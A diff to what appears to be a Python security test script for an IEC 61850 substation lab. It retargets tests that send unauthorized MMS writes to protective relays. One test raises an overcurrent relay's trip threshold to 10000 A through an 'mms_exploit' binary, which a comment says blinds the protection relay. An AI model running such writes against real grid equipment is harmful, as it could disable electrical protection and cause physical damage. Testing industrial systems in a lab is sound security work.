@@ -5,10 +5,12 @@ import threading
 from scapy.all import *
 
 #TARGET_IP = "10.0.0.2" # IP of IED1_XCBR
-TARGET_IP = "192.168.1.202" # IP of IED1_XCBR
+TARGET_IP = "10.0.0.2" # IP of IED1_XCBR
+IED2_PTOC = "10.0.0.3"
 TARGET_MAC = "01:0c:cd:01:00:02" # GOOSE Multicast
+
 TARGET_SV_MAC = "01:0c:cd:01:00:03" # SV Multicast
-IFACE = "wlan0"
+IFACE = "eth0"
 
 def test_mms_unauthorized_write():
     print("[*] Running Test A12: MMS Unauthorized Write...")
@@ -54,15 +56,16 @@ def test_mms_modify_protection_settings():
         # Normally this is ~200A. Raising it blinds the protection relay.
         # StrVal.setMag.f is usually under FC=SP (2) or FC=SE (7).
         print("[-] Sending MMS Write Float Request to override Relay Trip Threshold...")
+        # Note: IED2_PTOC is on 10.0.0.3
         result = subprocess.run(
-            ["/tests/mms_exploit", "10.0.0.3", "WRITE_FLOAT", "IED2_PTOCGenericIO/PTOC1.StrVal.setMag.f", "10000.0", "2"],
+            ["/tests/mms_exploit", IED2_PTOC, "WRITE_FLOAT", "IED2_PTOCGenericIO/PTOC1.StrVal.setMag.f", "10000.0", "2"],
             env={"LD_LIBRARY_PATH": "/tests"},
             capture_output=True, text=True
         )
         if "Error code: 0" not in result.stdout:
             # If FC=SP (2) failed, try FC=SE (7)
             result = subprocess.run(
-                ["/tests/mms_exploit", "10.0.0.3", "WRITE_FLOAT", "IED2_PTOCGenericIO/PTOC1.StrVal.setMag.f", "10000.0", "7"],
+                ["/tests/mms_exploit", IED2_PTOC, "WRITE_FLOAT", "IED2_PTOCGenericIO/PTOC1.StrVal.setMag.f", "10000.0", "7"],
                 env={"LD_LIBRARY_PATH": "/tests"},
                 capture_output=True, text=True
             )
